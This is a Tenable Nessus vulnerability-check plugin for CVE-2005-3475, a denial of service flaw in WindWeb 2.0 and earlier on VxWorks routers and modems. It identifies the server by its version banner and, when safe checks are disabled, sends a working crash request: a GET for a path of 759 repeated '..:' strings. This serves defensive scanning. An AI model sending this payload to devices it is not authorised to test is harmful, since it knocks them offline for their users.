#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20097);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-3475");
  script_bugtraq_id(15225);
  script_xref(name:"OSVDB", value:"20447");

  script_name(english:"WindWeb <= 2.0 Malformed GET Request Remote DoS");
  script_summary(english:"Checks for denial of service vulnerability in WindWeb <= 2.0");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to denial of service attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running the WindWeb web server, which is
found on embedded devices running Wind River Systems' VxWorks such as
certain ADSL modems and routers. 

The version of WindWeb installed on the remote host is affected by a
remote denial of service vulnerability when it receives maliciously-
crafted requests.  An attacker may be able to leverage this issue to
deny access to the web server to legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/Hasbani_dos.c" );
 script_set_attribute(attribute:"solution", value:
"Limit access to the web server." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();


  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

# Make sure it's WindWeb.
banner = get_http_banner(port:port);
if (banner && " WindWeb/" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    # If we're being paranoid...
    if (report_paranoia > 1) {
      if (egrep(pattern:"^Server: +WindWeb/([01]\.|2\.0($|[^0-9]))", string:banner)) {
        report = string(
          "Nessus has determined the vulnerability exists on the remote\n",
          "host simply by looking at the version number of WindWeb\n",
          "installed there.\n"
        );
        security_warning(port:port, extra:report);
      }
    }
  }
  # Otherwise, try to crash it.
  else if (!http_is_dead(port:port)) {
    u = crap(length: 759, data: "..:");
    r = http_send_recv3(port: port, method: "GET", version: 10, item: u);
    sleep(1);
    if (http_is_dead(port:port)) {
      security_warning(port);
      exit(0);
    }
  }
}
